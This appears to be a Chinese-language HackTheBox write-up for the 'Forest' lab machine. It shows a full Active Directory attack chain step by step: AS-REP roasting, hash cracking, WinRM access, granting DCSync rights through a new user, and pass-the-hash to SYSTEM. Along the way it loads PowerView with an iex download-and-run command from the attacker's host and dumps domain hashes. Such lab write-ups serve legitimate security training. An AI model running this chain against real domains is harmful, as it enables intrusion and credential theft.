<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>Forest - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="Forest - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/04/05/Boogipop-Forest/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-04-04T16:21:46.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/HackTheBox/">HackTheBox</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>April</span>
            <span>5,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">Forest</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680260480857-1e1b7e45-9055-4d13-8f33-f38c21731caa.png#averageHue=%23171f28&clientId=ub6f8b5b7-47ff-4&from=paste&height=542&id=u70936632&name=image.png&originHeight=677&originWidth=1153&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=145970&status=done&style=none&taskId=ua59b7ce6-a1ea-4add-a490-8c63db0a3c2&title=&width=922.4" alt="image.png"><br>这个easy好像是标错了？我看评分Medium的比Easy多。。。。Orz</p>
<h1 id="一、知识点"><a href="#一、知识点" class="headerlink" title="一、知识点"></a>一、知识点</h1><ul>
<li>AD域渗透提取</li>
<li>HoundBlood猎犬寻找最短路径</li>
<li>Kerberos预身份验证风险</li>
<li>Hash离线爆破</li>
<li>PTH传递攻击</li>
<li>DCSync攻击</li>
</ul>
<h1 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h1><p>Nmap先嗦一口<code>nmap -sS -sC -sV -Pn 10.10.10.161</code>，探测结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-31 15:41 CST</span><br><span class="line">Nmap scan report for forest.htb (10.10.10.161)</span><br><span class="line">Host is up (0.26s latency).</span><br><span class="line">Not shown: 989 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">53/tcp   open  domain       Simple DNS Plus</span><br><span class="line">88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-03-31 07:49:08Z)</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  tcpwrapped</span><br><span class="line">3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  tcpwrapped</span><br><span class="line">Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   311:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 2h26m48s, deviation: 4h02m30s, median: 6m47s</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2023-03-31T07:49:36</span><br><span class="line">|_  start_date: 2023-03-31T07:42:13</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)</span><br><span class="line">|   Computer name: FOREST</span><br><span class="line">|   NetBIOS computer name: FOREST\x00</span><br><span class="line">|   Domain name: htb.local</span><br><span class="line">|   Forest name: htb.local</span><br><span class="line">|   FQDN: FOREST.htb.local</span><br><span class="line">|_  System time: 2023-03-31T00:49:34-07:00</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 140.80 seconds</span><br></pre></td></tr></table></figure>
<p>发现存在smb和ldap服务，这两者都可以探测先，可以先使用<code>smbclent</code>去看看，发现是啥也没有的，然后开启MSF看看有无MS17漏洞<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680260759632-0e954f15-0d52-40bf-a08e-0f90f875bbcf.png#averageHue=%2335352b&clientId=u7548b3dd-f658-4&from=paste&height=118&id=u238cace4&name=image.png&originHeight=147&originWidth=1060&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=228838&status=done&style=none&taskId=ucaf2f4c9-d397-40a2-b495-5eaa9578fbc&title=&width=848" alt="image.png"><br>也显然是没有的</p>
<h1 id="三、Ldap匿名访问"><a href="#三、Ldap匿名访问" class="headerlink" title="三、Ldap匿名访问"></a>三、Ldap匿名访问</h1><p>因此思路放回ldap服务，既然开启了的话，是非常值得试一下有没有开启匿名访问的<br>根据nmap探测出的结果可以知道域名为<code>htb.local</code><br><code>ldapsearch -H ldap://10.10.10.161:389 -x -b &quot;dc=htb,dc=local&quot;</code></p>
<blockquote>
<p>-x 简单验证，也就是anoymous匿名访问<br>-b 指定筛选条件</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680260932071-7f963f78-4825-4a16-a070-6fd57b3539c4.png#averageHue=%2333322b&clientId=u7548b3dd-f658-4&from=paste&height=96&id=u2c6cf6f3&name=image.png&originHeight=120&originWidth=828&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=171590&status=done&style=none&taskId=uc99ebb23-17c6-4bf2-884e-9812d9947f2&title=&width=662.4" alt="image.png"></p>
<h1 id="四、离线哈希爆破"><a href="#四、离线哈希爆破" class="headerlink" title="四、离线哈希爆破"></a>四、离线哈希爆破</h1><p>茫茫人海可以瞟到svc-alfresco这个用户，google检索一波alfresco可以发现有趣的东西：</p>
<blockquote>
<p>Process Services is an enterprise Business Process Management (BPM) solution targeted at business people and developers. At its core is a high performance open-source business process engine based on Activiti with the flexibility and scalability to handle a wide variety of critical processes. Process Services provides a powerful suite of end user tools and integrates with a range of enterprise systems, including Alfresco Content Services, Box and Google Drive.<br>Process Services 是一种针对业务人员和开发人员的企业业务流程管理 (BPM) 解决方案。 其核心是基于 Activiti 的高性能开源业务流程引擎，具有处理各种关键流程的灵活性和可扩展性。 Process Services 提供了一套功能强大的最终用户工具，并与一系列企业系统集成，包括 Alfresco Content Services、Box 和 Google Drive。</p>
</blockquote>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680260993039-38aa6640-4321-4fb1-bc7e-fb2131a5d114.png#averageHue=%23fdfdfc&clientId=u7548b3dd-f658-4&from=paste&height=727&id=ua610454e&name=image.png&originHeight=909&originWidth=1424&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=109114&status=done&style=none&taskId=u40dd48b3-73c4-40f8-af74-b5d9e5003a3&title=&width=1139.2" alt="image.png"><br>这个服务对应的用户需要关闭kerberos的身份预验证服务<br><strong>有关kerberos协议的内容请自行去查看，网上很多，这个也是域渗透的基础</strong><br>当关闭了预身份验证后，攻击者可以使用指定用户去请求票据，此时域控不会作任何验证就将 TGT票据 和 该用户Hash加密的Session Key返回。因此，攻击者就可以对获取到的 用户Hash加密的Session Key进行离线破解，如果破解成功，就能得到该指定用户的密码明文。<br>使用这个工具包下的模块获取TGT票据：<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a><br>拿到kali后在setup.py文件所在地先<code>pip install .</code>将py文件全部变为模块，以后就可以直接<code>xx.py</code>使用<br><code>GetNPUsers.py htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass</code><br>获取到票据后保存到文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5asrep$23$svc-alfresco@HTB.LOCAL:ea889f8edb24751d735ffda00e6cff9f$534acd4d2abb6a071348a94f5263de0b6b0e46232fd890baabbca96b6ffe14941b61429c33581169c4ded4054d100acb6329ff4dbe2b8acfb8236896e79a549fd92803281118fa9df252883ca317fae2785f2a61337a68f12649b5bb646e1945503cc11dff113cb01e896189e233f6d05fdb85fe789f924cb890bae08cbac29b3062696df1c1cc0d909777ea54d94d5d8d0a22b4bdc18cefe2bb6f6b397c1856e42dfcbc9af2185c6d964464baa1d9b24634c37ab129b827798aeb60478235577ab44c9565fa4c1621da0a630c662a66173872ae74660114688a1964107c52ef7961d4ff47e6</span><br></pre></td></tr></table></figure>
<p>随之用john工具对其进行rock<br><code>john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt</code><br>由于john有缓存<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680261788269-151519df-4334-4026-b32b-2ad86524df39.png#averageHue=%2322231e&clientId=u7548b3dd-f658-4&from=paste&height=80&id=udadd31f0&name=image.png&originHeight=100&originWidth=732&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93405&status=done&style=none&taskId=u87448e69-d6c4-46aa-9a87-ca5b20da8ba&title=&width=585.6" alt="image.png"><br>可以看到密码为<code>s3rvice</code>知道用户的密码后就好说了，直接上<code>evil-winrm</code>去远程连接即可<br><code> evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680261845197-f9ee2297-c57a-44ef-b4f2-e467b08ec478.png#averageHue=%2321211d&clientId=u7548b3dd-f658-4&from=paste&height=46&id=ufa74d3f8&name=image.png&originHeight=58&originWidth=618&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=59671&status=done&style=none&taskId=u6573c806-7714-4b8f-b022-bc699dc4be0&title=&width=494.4" alt="image.png"><br>随后在desktop下发现user.txt，至此获取user权限</p>
<h1 id="五、AD域渗透权限提升"><a href="#五、AD域渗透权限提升" class="headerlink" title="五、AD域渗透权限提升"></a>五、AD域渗透权限提升</h1><p>这个我觉得也是全篇最难的地方，也是知识点最多的地方。。</p>
<h2 id="（1）BloodHound信息搜集"><a href="#（1）BloodHound信息搜集" class="headerlink" title="（1）BloodHound信息搜集"></a>（1）BloodHound信息搜集</h2><p>FirstofAll，windows权限提升是有一款专门的工具叫做猎犬：<code>BloodHound</code><br>这个工具和tabby对标，tabby是找链子，BloodHound则是找最短获得System权限的路径，他们都是基于neo4j数据库进行逻辑分析的<br>这里首推kali中的<code>bloodhound-python</code>，运行<code>pip install bloodhound</code><br>之后使用<code>bloodhound-python -d htb.local -usvc-alfresco -p s3rvice</code>去手机信息</p>
<blockquote>
<p>-d domain<br>-u username<br>-p password</p>
</blockquote>
<p>收集完毕后会产生json结果数据：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262694264-414dedc7-3616-4ac1-a964-ea5190ddef07.png#averageHue=%2334332c&clientId=u7e313bdf-7b57-4&from=paste&height=106&id=u435f43ad&name=image.png&originHeight=133&originWidth=854&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=201352&status=done&style=none&taskId=uc400a1c8-4505-4794-bd75-d297493f42b&title=&width=683.2" alt="image.png"><br>随后我们需要做的是准备BloodHound的GUI界面，这个在windows中使用，他就是tabby，用来分析导入的json数据的，这个我们在github上也有开源的项目<br><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262735765-15764b8d-5cbd-4de9-b1b0-3cfca46b727b.png#averageHue=%23fefefe&clientId=u7e313bdf-7b57-4&from=paste&height=27&id=u72ad1424&name=image.png&originHeight=34&originWidth=328&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3520&status=done&style=none&taskId=ue879789f-581e-49ef-a498-8b286946f5b&title=&width=262.4" alt="image.png"><br>安装win32-64的，安装完毕后解压出现<code>BloodHound.exe</code>运行，再此之前你需要安装neo4j数据库，默认的username（数据库）和password是<code>neo4j/neo4j</code><br>之后就会出现GUI界面：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262811447-febc8b62-89e4-4d6c-aeb3-a6aea800e360.png#averageHue=%23828282&clientId=u7e313bdf-7b57-4&from=paste&height=628&id=ub0cb0d64&name=image.png&originHeight=785&originWidth=1580&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=46090&status=done&style=none&taskId=u007c94ac-f3a1-423f-8bbc-e603709550c&title=&width=1264" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262821244-e358caf0-4567-4a41-810f-b06eae3a5bfa.png#averageHue=%238ea6a1&clientId=u7e313bdf-7b57-4&from=paste&height=660&id=udedc5227&name=image.png&originHeight=825&originWidth=1431&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=32300&status=done&style=none&taskId=uee6cba8d-861a-498a-9be4-71c9c9c6326&title=&width=1144.8" alt="image.png"><br>(我导入过数据了）<br>首先导入刚刚收集到的json文件：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262852513-48fc4982-1e2b-4b9e-b33a-6d2542de4145.png#averageHue=%23f3f5f8&clientId=u7e313bdf-7b57-4&from=paste&height=45&id=u57d269c2&name=image.png&originHeight=56&originWidth=253&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1012&status=done&style=none&taskId=ua30e0740-17b2-4843-bc9f-09e73ce44c9&title=&width=202.4" alt="image.png"><br>点击这个上传按钮将你的json文件全部提交上传<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262871341-007bb829-291a-47ce-bdbf-b053221c0d07.png#averageHue=%23caa76b&clientId=u7e313bdf-7b57-4&from=paste&height=574&id=uf6a9a7c8&name=image.png&originHeight=717&originWidth=1278&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=102426&status=done&style=none&taskId=u7074de52-8039-4bec-9dee-f031970f216&title=&width=1022.4" alt="image.png"><br>之后数据库info就会更新<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680262967995-6164af6b-8dcb-4ef1-9592-e784815074c7.png#averageHue=%23f2f2f2&clientId=u7e313bdf-7b57-4&from=paste&height=526&id=uc4906bc5&name=image.png&originHeight=658&originWidth=484&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30336&status=done&style=none&taskId=u3bb92cf6-2e93-4e89-a70b-f9494d0e0d3&title=&width=387.2" alt="image.png"><br>随后我们查找一下我们已有用户<code>svc-alfresco</code>相关信息：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680263033638-6d93920f-4669-4e4d-a644-f375d97d1644.png#averageHue=%234ac14e&clientId=u7e313bdf-7b57-4&from=paste&height=729&id=u5894d149&name=image.png&originHeight=911&originWidth=1471&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=111277&status=done&style=none&taskId=uf05b1a6f-8e7d-433c-aaf7-90a46004a40&title=&width=1176.8" alt="image.png"></p>
<h2 id="（2）信息分析"><a href="#（2）信息分析" class="headerlink" title="（2）信息分析"></a>（2）信息分析</h2><p>可以看到<code>unrolled group Membership</code>这可以让你展开与它有关的用户组和用户，点击之后可以发现<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680263107649-e0d89a89-42d1-468d-b447-12e0c5ad2c9c.png#averageHue=%23eff2f7&clientId=u7e313bdf-7b57-4&from=paste&height=1054&id=ucd8e44f3&name=image.png&originHeight=1318&originWidth=2257&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=120927&status=done&style=none&taskId=u3994aa3b-a525-496c-aaf6-70a5d66e1a3&title=&width=1805.6" alt="image.png"><br>关系和权限写的明明白白，我们重点需要关注<code>PRIVILEGED IT ACCOUNTS</code>，你可以理解为这个组有ROOT权限，然后注意有个<code>ACCOUTN OPERATION</code>用户组，也就是可以对账户进行创建和修改的用户组<br>然后点击Shorest way to high target寻找最短路径<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680264089092-acdc2666-4f87-4d6c-962d-1502f23b7c3e.png#averageHue=%23eef0f3&clientId=u7e313bdf-7b57-4&from=paste&height=692&id=ub5d6b434&name=image.png&originHeight=865&originWidth=1294&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66073&status=done&style=none&taskId=u147a2852-5080-452b-88d0-a68cf09e676&title=&width=1035.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680264154528-71901a58-48f5-46a3-9b53-18039dffb9dc.png#averageHue=%23e7ecf0&clientId=u7e313bdf-7b57-4&from=paste&height=301&id=ufa89986a&name=image.png&originHeight=376&originWidth=1109&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=117041&status=done&style=none&taskId=uf87ae8a1-f6e6-4140-a487-6f1e0e0beab&title=&width=887.2" alt="image.png"><br>可以发现<code>EXCHANGE WINDOWS PERMISSONS</code>用户组是具有<code>WriteDacl</code>的权限<br><strong>WriteDacl 允许委托人修改受影响对象 DACL。这意味着攻击者可以添加或删除特定的访问控制项，从而使他们可以授予自己对对象的完全访问权限。因此，WriteDacl 是在链中启用其他权利的权利。</strong><br>当前拥有 WriteDacl 权限，没有 DCSync 权限。可以自己写入DCSync权限（下面会讲)，然后dump管理员的hash，最后进行PTH票据传递攻击</p>
<h2 id="（3）创建一个恶意用户"><a href="#（3）创建一个恶意用户" class="headerlink" title="（3）创建一个恶意用户"></a>（3）创建一个恶意用户</h2><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/308202.html">https://www.freebuf.com/articles/web/308202.html</a><br>分析好了就开始实操，回到我们的evil-winrm，首先利用ACCOUNT OPERATION的权限去创建一个新的用户</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net user boogipop abc123! /add /domain</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net group &quot;Exchange Windows Permissions&quot; boogipop /add</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; net localgroup &quot;Remote Management Users&quot; boogipop /add</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure>
<p>这样用户就创建完毕了，之后利用WriteDacl权限去给我们用户所在组加权限，这里就得用到另外一个工具了<br>在其中的Recon模块中有个Powerview.ps1模块，这个模块可以协助我们进行权限赋予<br>首先在自己的机子上开python服务准备这个文件，然后再winrm中导入<br><code>iex(new-Object net.webclient).downloadstring(&#39;[http://10.10.16.3:8000/PowerView.ps1&#39;)](http://10.10.16.3:8000/PowerView.ps1&#39;))</code><br>导入之后运行<code>menu</code>可以发现模块增加<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680264858155-38f6282f-93c5-487a-9a74-31424d165ae3.png#averageHue=%23303026&clientId=u7e313bdf-7b57-4&from=paste&height=438&id=udc4d8b14&name=image.png&originHeight=547&originWidth=1145&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=849010&status=done&style=none&taskId=u6a992c0f-8eb2-4c17-b19e-b6d300be3c4&title=&width=916" alt="image.png"><br>首先定义2个变量<br><code>$pass=convertto-securestring &#39;abc123!&#39; -asplain -force</code><br><code>$cred=new-object system.management.automation.pscredential(&#39;htb\boogipop&#39;,$pass)</code><br>其中Add-ObjectACL模块可以添加DCSync权限<code>Add-ObjectACL -PrincipalIdentity boogipop -Credential $cred -Rights DCSync</code></p>
<h2 id="（4）DCSync攻击导出管理员hash"><a href="#（4）DCSync攻击导出管理员hash" class="headerlink" title="（4）DCSync攻击导出管理员hash"></a>（4）DCSync攻击导出管理员hash</h2><p><a target="_blank" rel="noopener" href="https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/#DCSync%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8">https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-xi/#DCSync%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8</a></p>
<blockquote>
<p>DCSync攻击原理<br>DCSync 的原理非常清晰，利用域控制器之间的数据同步复制。</p>
<p>发现网络中的目标域控制器;<br>通过 DRS 服务的 GetNCChanges 接口发起数据同步请求，Directory Replication Service (DRS) Remote Protocol<br>Samba wiki 关于 GetNCChanges 的描述包括:<br> 当一个 DC (客户端 DC)想从其他 DC (服务端 DC)获取数据时，客户端 DC 会向服务端 DC 发起一个 GetNCChanges 请求。回应的数据包括需要同步的数据。<br>如果需要同步的数据比较多，则会重复上述过程。毕竟每次回应的数据有限。</p>
</blockquote>
<p>主打一个数据同步<br>一个用户想发起 DCSync 攻击，必须获得以下任一用户的权限：</p>
<ul>
<li>Administrators组内的用户</li>
<li>Domain Admins组内的用户</li>
<li>Enterprise Admins组内的用户</li>
<li>域控制器的计算机帐户</li>
</ul>
<p>上述过程中我们直接创建了一个有Sync权限的用户，因此接下来该做的解释导出管理员hash，这里还是使用impacket包下的一个模块<code>secretsdump</code><br><code>secretsdump.py  htb/boogipop@10.10.10.161</code><br>之后可以获取所域中所有用户的hash，包括admin的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>
<p>可以发现admin的hash</p>
<h2 id="（5）PTH票据传递获取Root"><a href="#（5）PTH票据传递获取Root" class="headerlink" title="（5）PTH票据传递获取Root"></a>（5）PTH票据传递获取Root</h2><p>最后通过PTH攻击即可获取root权限，这里使用的也是该工具包中的模块<code>psexec</code><br><code>psexec.py administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680265239008-a7e4ecae-0c65-4eb3-8e5c-0df51a4bea9b.png#averageHue=%23343328&clientId=u7e313bdf-7b57-4&from=paste&height=289&id=u35f926c7&name=image.png&originHeight=361&originWidth=1205&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=585428&status=done&style=none&taskId=uf9b6c975-d0eb-406c-ad43-b65f7e706d8&title=&width=964" alt="image.png"><br>获取system权限。<br>最后也是在desktop中获取root.txt<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1680265274467-22fa66dd-c8d9-476d-b670-cc3999e5ad08.png#averageHue=%23313128&clientId=u7e313bdf-7b57-4&from=paste&height=56&id=ub065a31e&name=image.png&originHeight=70&originWidth=749&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=78940&status=done&style=none&taskId=u7a48021c-72a8-4022-92da-b1edb46889e&title=&width=599.2" alt="image.png"><br>拿下~</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/HackTheBox/" class="tag">#HackTheBox</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/04/05/Socket-Boogipop/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">Socket</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd%20%5Beasy_php%5D/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">愚人杯3rd [easy_php]</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
